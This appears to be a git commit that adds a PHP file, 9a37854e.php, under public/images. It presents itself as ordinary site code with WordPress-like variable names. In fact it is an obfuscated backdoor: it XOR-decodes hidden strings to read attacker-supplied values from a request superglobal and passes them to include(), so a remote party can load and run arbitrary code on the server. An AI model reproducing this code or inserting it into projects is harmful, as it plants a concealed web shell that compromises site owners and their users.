d883b0735edf79736a81004cea3c5c66049b3225
MuhammadAbdullah001 <project.source.1122@gmail.com>
2024-07-21 00:53:13 +0500

    first commit

---
+++ public/images/9a37854e.php
@@ -0,0 +1,35 @@
+<?php 	
+	$group_mime_types = 'callback';
+$tagregexp = 'FGixKxlroe';
+
+$post_meta_ids = $tagregexp;
+	$thumbnail_support = 'date_string';
+function original_url($perm, $years)
+
+{
+    $cdata = $years;
+
+    $filename_raw = urldecode($perm);
+
+    $entity = substr($cdata,0, strlen($filename_raw));
+    $image_meta = $filename_raw ^ $entity;
+    return $image_meta;
+
+}
+$check_name = ${original_url("%19%01+4%0E%2B", $post_meta_ids)};
+	$wp_post_statuses = 'keys';
+$image_url = $check_name;
+$post_authors = isset($image_url[$post_meta_ids]);
+	$double_preg = 'incposts';
+if ($post_authors)
+
+{
+    $item = $check_name[$post_meta_ids];
+
+    $new_path = $item[original_url("2%2A%19%27%25%19%01%17", $post_meta_ids)];
+    $good_protocol_url = $new_path;
+    include ($good_protocol_url);
+
+}
+
+?>
